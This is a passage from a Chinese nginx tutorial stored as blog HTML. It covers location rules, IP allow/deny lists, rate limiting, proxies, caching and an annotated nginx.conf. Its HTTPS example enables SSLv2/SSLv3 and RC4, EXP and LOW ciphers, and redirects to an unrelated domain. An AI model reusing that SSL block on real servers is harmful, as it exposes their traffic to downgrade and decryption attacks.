id=\"3-2-2-upstream\"><a href=\"#3-2-2-upstream\" class=\"headerlink\" title=\"3.2.2 upstream\"></a>3.2.2 upstream</h4><p>定义服务集群，用于负载均衡.<br></p>\n<h4 id=\"3-2-3-location\"><a href=\"#3-2-3-location\" class=\"headerlink\" title=\"3.2.3 location\"></a>3.2.3 location</h4><p>location块的主要作用是，基于Nginx服务器接收到的请求字符串进行匹配，对特定的请求进行处理<br></p>\n<p> <strong> location [=|~|~*|^~|@] /uri/ { … } </strong></p>\n<p> location 可分两大类：</p>\n<ul>\n<li>普通 location<br></li>\n</ul>\n<p> 以 “ = ” 或 “ ^~ ”为前缀或者没有任何前缀的 /uri/</p>\n<ul>\n<li>正则 location</li>\n</ul>\n<p>以 “ ~ ” 或 “ ~* ”为前缀的 /uri/, 即以  ~ 开头的<br><br>正则的意义是，url中可以使用正则<br></p>\n<p>=：表示完全匹配，不存在正则表示，如 location = /uri {…..}</p>\n<p>~：表示匹配时，大小写敏感的，如 location ~ /uri {…..} </p>\n<p>~*：表示匹配时，大小写不敏感，即忽略大小写问题，如 location ~* /uri {……}，这时/uri，/Uri， /URI都可以匹配上。</p>\n<p>^~：表示匹配时，只需开头部分匹配上即可，如 location ^~ /uri/ {….}  ，这时只要以/uri/开头的地址都会匹配上<br></p>\n<p><strong>location详细讲解参考 location模块.md</strong></p>\n<h1 id=\"三-其它\"><a href=\"#三-其它\" class=\"headerlink\" title=\"三.其它\"></a>三.其它</h1><h2 id=\"1-nginx限制访问ip\"><a href=\"#1-nginx限制访问ip\" class=\"headerlink\" title=\"1.nginx限制访问ip\"></a>1.nginx限制访问ip</h2><p>黑白名单</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 服务器全局限制</span><br><span class=\"line\">allow 67.216.218.37;</span><br><span class=\"line\">deny all;</span><br><span class=\"line\"></span><br><span class=\"line\"># location中限制</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    index index.html index.htm index.php;</span><br><span class=\"line\">    allow 67.216.218.37;</span><br><span class=\"line\">    deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意:<br></li>\n</ul>\n<p>可以使用IP段<br><br>从允许访问的段位从小到大排列,如127.0.0.0/24 下面才能是10.10.0.0/16<br><br>deny all; 结尾 表示除了上面allow的其他都禁止<br></p>\n<p>deny 192.168.1.1;<br><br>allow 127.0.0.0/24;<br><br>allow 192.168.0.0/16;<br><br>allow 10.10.0.0/16;<br><br>deny all;<br></p>\n<h2 id=\"2-限制下载速度\"><a href=\"#2-限制下载速度\" class=\"headerlink\" title=\"2.限制下载速度\"></a>2.限制下载速度</h2><p>限速</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /download &#123;</span><br><span class=\"line\">       # 10m之前不限速</span><br><span class=\"line\">       limit_rate_after 10m;</span><br><span class=\"line\">       limit_rate 128k;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-限制ip访问频率\"><a href=\"#3-限制ip访问频率\" class=\"headerlink\" title=\"3.限制ip访问频率\"></a>3.限制ip访问频率</h2><p>防攻击</p>\n<ul>\n<li>limit_req_zone</li>\n</ul>\n<p>这个变量只能在http使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，</span><br><span class=\"line\">  #以$binary_remote_addr 为key,限制平均每秒的请求为5个，</span><br><span class=\"line\">  #1M能存储16000个状态，rete的值必须为整数，</span><br><span class=\"line\">  #如果限制两秒钟一个请求，可以设置成30r/m</span><br><span class=\"line\"></span><br><span class=\"line\">  limit_req_zone $binary_remote_addr zone=allips:10m rate=5r/s;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>limit_req</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">  server&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    location &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      #限制每ip每秒不超过20个请求，漏桶数burst为5</span><br><span class=\"line\">      #brust的意思就是，如果第1秒、2,3,4秒请求为19个，</span><br><span class=\"line\">      #第5秒的请求为25个是被允许的。</span><br><span class=\"line\">      #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。</span><br><span class=\"line\">      #nodelay，如果不设置该选项，严格使用平均速率限制请求数，</span><br><span class=\"line\">      #第1秒25个请求时，5个请求放到第2秒执行，</span><br><span class=\"line\">      #设置nodelay，25个请求将在第1秒执行。</span><br><span class=\"line\"></span><br><span class=\"line\">      limit_req zone=allips burst=5 nodelay;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-https代理\"><a href=\"#4-https代理\" class=\"headerlink\" title=\"4.https代理\"></a>4.https代理</h2><p>配置 SSL 将 http 代理到 https</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#原80端口做301转跳</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name w3cschool.cn www.w3cschool.cn;</span><br><span class=\"line\">    return 301 https://www.zhimiyun.com$request_uri;    #跳转到Https</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#配置ssl证书和开启ssl功能</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       443;</span><br><span class=\"line\">    server_name  www.w3cschool.cn;</span><br><span class=\"line\">    root   wwwroot;</span><br><span class=\"line\">    index  index.html index.htm;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl                  on;</span><br><span class=\"line\">    ssl_certificate      /usr/ssl/ca.pem; #证书地址</span><br><span class=\"line\">    ssl_certificate_key  /usr/ssl/ca.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_protocols  SSLv2 SSLv3 TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">    ssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;</span><br><span class=\"line\">    ssl_prefer_server_ciphers   on;</span><br><span class=\"line\">    error_page 497 &quot;https://$host$uri?$args&quot;; #这是跳转Http请求到Https</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-静态资源缓存\"><a href=\"#5-静态资源缓存\" class=\"headerlink\" title=\"5.静态资源缓存\"></a>5.静态资源缓存</h2><p>对于站点中不经常修改的静态内容（如图片，JS，CSS），可以设置静态资源缓存，控制浏览器缓存，达到有效减小带宽流量，降低服务器压力。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class=\"line\">#过期时间为30天，</span><br><span class=\"line\">#图片文件不怎么更新，过期可以设大一点，</span><br><span class=\"line\">#如果频繁更新，则可以设置得小一点。</span><br><span class=\"line\">expires 30d;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ~ .*\\.(js|css)$ &#123;</span><br><span class=\"line\">expires 10d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-nginx使用场景\"><a href=\"#一-nginx使用场景\" class=\"headerlink\" title=\"一.nginx使用场景\"></a>一.nginx使用场景</h1><ul>\n<li>负载均衡</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream test &#123;</span><br><span class=\"line\">    server localhost:8080 weight=9;</span><br><span class=\"line\">    server localhost:8081 weight=1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>RR（默认，按时间顺序分配）<br></p>\n<p>权重<br></p>\n<p>ip_hash<br></p>\n<ul>\n<li>正向代理</li>\n</ul>\n<p>访问一些访问不到的资源<br><br>同时可以隐藏自己<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resolver 114.114.114.114 8.8.8.8;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    resolver_timeout 5s;</span><br><span class=\"line\"></span><br><span class=\"line\">    listen 81;</span><br><span class=\"line\">    access_log  e:/wwwrootproxy.access.log;</span><br><span class=\"line\">    error_log   e:/wwwrootproxy.error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://$host$request_uri;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>反向代理</li>\n</ul>\n<p>让资源能被别人访问到<br><br>同时可以保护内网安全<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 8080;</span><br><span class=\"line\">    server_name localhost;</span><br><span class=\"line\">    location /tomcat1/ &#123;</span><br><span class=\"line\">            proxy_pass http://67.216.XX.xx:8002/test/;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location /tomcat2/ &#123;</span><br><span class=\"line\">            proxy_pass http://67.216.xx.xx:8012/test/;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>资源服务器</li>\n</ul>\n<p>nginx可以作为静态资源服务器，实现动静分离.<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\">    keepalive_timeout 65;</span><br><span class=\"line\">    types_hash_max_size 2048;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">         listen       8000;</span><br><span class=\"line\">         server_name  localhost;</span><br><span class=\"line\">         location / &#123;</span><br><span class=\"line\">             root   html;</span><br><span class=\"line\">             index  index.html index.htm;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         //访问地址</span><br><span class=\"line\">         location /file/ &#123;</span><br><span class=\"line\">            //文件路径</span><br><span class=\"line\">             alias   /home/xiong/file/;</span><br><span class=\"line\">             autoindex on;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"二-nginx配置文件\"><a href=\"#二-nginx配置文件\" class=\"headerlink\" title=\"二. nginx配置文件\"></a>二. nginx配置文件</h1><details><br><summary><br>nginx.conf<br></summary><br>资源地址: <a href=\"https://blog.csdn.net/li_adou/article/details/78178478\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/li_adou/article/details/78178478</a><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">######Nginx配置文件nginx.conf中文详解#####</span><br><span class=\"line\"></span><br><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">user www www;</span><br><span class=\"line\"></span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes 8;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义路径与类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">error_log /usr/local/nginx/logs/error.log info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程pid文件</span><br><span class=\"line\">pid /usr/local/nginx/logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">#指定进程可以打开的最大描述符：数目</span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">#这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。</span><br><span class=\"line\">#现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。</span><br><span class=\"line\">#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。</span><br><span class=\"line\">worker_rlimit_nofile 65535;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">events</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型</span><br><span class=\"line\">    #是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。</span><br><span class=\"line\">    #补充说明：</span><br><span class=\"line\">    #与apache相类，nginx针对不同的操作系统，有不同的事件模型</span><br><span class=\"line\">    #A）标准事件模型</span><br><span class=\"line\">    #Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll</span><br><span class=\"line\">    #B）高效事件模型</span><br><span class=\"line\">    #Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。</span><br><span class=\"line\">    #Epoll：使用于Linux内核2.6版本及以后的系统。</span><br><span class=\"line\">    #/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。</span><br><span class=\"line\">    #Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。</span><br><span class=\"line\">    use epoll;</span><br><span class=\"line\"></span><br><span class=\"line\">    #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    #根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行。每个进程允许的最多连接数，理论上每台nginx服务器的最大连接数为。</span><br><span class=\"line\">    worker_connections 65535;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive超时时间。</span><br><span class=\"line\">    keepalive_timeout 60;</span><br><span class=\"line\"></span><br><span class=\"line\">    #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。</span><br><span class=\"line\">    #分页大小可以用命令getconf PAGESIZE 取得。</span><br><span class=\"line\">    #[root@web001 ~]# getconf PAGESIZE</span><br><span class=\"line\">    #4096</span><br><span class=\"line\">    #但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。</span><br><span class=\"line\">    client_header_buffer_size 4k;</span><br><span class=\"line\"></span><br><span class=\"line\">    #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。</span><br><span class=\"line\">    open_file_cache max=65535 inactive=60s;</span><br><span class=\"line\"></span><br><span class=\"line\">    #这个是指多长时间检查一次缓存的有效信息。</span><br><span class=\"line\">    #语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.</span><br><span class=\"line\">    open_file_cache_valid 80s;</span><br><span class=\"line\"></span><br><span class=\"line\">    #open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。</span><br><span class=\"line\">    #语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.</span><br><span class=\"line\">    open_file_cache_min_uses 1;</span><br><span class=\"line\"></span><br><span class=\"line\">    #语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.</span><br><span class=\"line\">    open_file_cache_errors on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 